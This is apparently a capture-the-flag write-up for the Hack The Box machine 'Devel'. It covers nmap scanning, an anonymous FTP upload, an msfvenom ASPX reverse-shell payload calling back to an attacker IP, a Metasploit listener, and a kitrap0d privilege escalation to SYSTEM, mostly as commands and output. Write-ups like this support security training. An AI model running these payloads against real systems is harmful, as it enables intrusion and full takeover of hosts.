# Devel

<pre>nmap -p- 10.10.10.5 -Pn

PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http


nmap -p 21,80 -sV -sC -T4 10.10.10.5

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</pre>

<pre>ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png</pre>

<pre>ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put hello.txt</pre>

- Browse to uploaded `hello.txt` file hosted on the server `http://10.10.10.5/hello.txt`
- We are able to view the file
- Generate msfvenom payload to upload

<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.73 LPORT=1234 -f aspx -o reverse_shell.aspx</pre>

- Upload to FTP server
- Setup listener

<pre>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.73
set LPORT 1234
run</pre>

- Browse to http://10.10.10.5/reverse_shell.aspx</pre>
- Receive reverse shell on listener

<pre>meterpreter > getuid
Server username: IIS APPPOOL\Web

meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows</pre>

## System Enumeration

<pre>systeminfo</pre>

<pre>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</pre>

<pre>wmic qfe</pre>

<pre>wmic logicaldisk</pre>

<pre>wmic logicaldisk get caption,description,providername</pre>

## User Enumeration

<pre>whoami</pre>

<pre>whoami /priv</pre>

<pre>whoami /groups</pre>

<pre>netuser</pre>

<pre>netuser username</pre>

<pre>net localgroup Administrators</pre>

## Network Enumeration

<pre>ipconfig</pre>

<pre>ipconfig /all</pre>

<pre>arp -a</pre>

<pre>route print</pre>

## Metasploit - Privilege Escalation

- Background meterpreter session
- Use `post/multi/recon/local_exploit_suggester`

<pre>#   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 3   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.</pre>

<pre>msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.73:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2536 launched.
[*] Reflectively injecting the DLL into 2536...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.73:4444 -> 10.10.10.5:49195) at 2024-05-07 19:31:04 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM</pre>

